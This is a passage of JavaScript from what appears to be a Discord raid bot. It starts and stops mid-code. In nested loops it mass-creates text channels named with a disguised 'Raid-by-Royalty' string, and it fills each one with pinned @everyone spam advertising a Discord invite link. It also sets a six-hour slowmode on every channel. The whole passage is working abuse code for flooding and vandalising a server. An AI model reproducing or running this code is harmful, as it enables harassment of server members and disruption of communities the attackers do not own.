     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

            //////////////

            for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
     }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}


            //////////////

           for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

            /////////////////////

            for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
    for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

            /////////////////////

            for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

            ////////////////////////

            for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
    for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

            //////////////////////

           for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
